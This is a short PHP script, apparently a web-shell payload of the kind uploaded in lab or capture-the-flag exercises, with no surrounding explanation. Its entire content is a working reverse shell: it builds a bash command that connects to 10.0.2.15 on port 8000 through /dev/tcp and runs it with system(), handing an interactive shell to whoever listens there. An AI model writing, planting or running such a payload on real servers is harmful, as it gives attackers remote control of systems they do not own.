<?php
$ip = '10.0.2.15';
$port = '8000';
$shell = 'bash -c "bash -i >& /dev/tcp/' . $ip . '/' . $port . ' 0>&1"';
system($shell);
?>
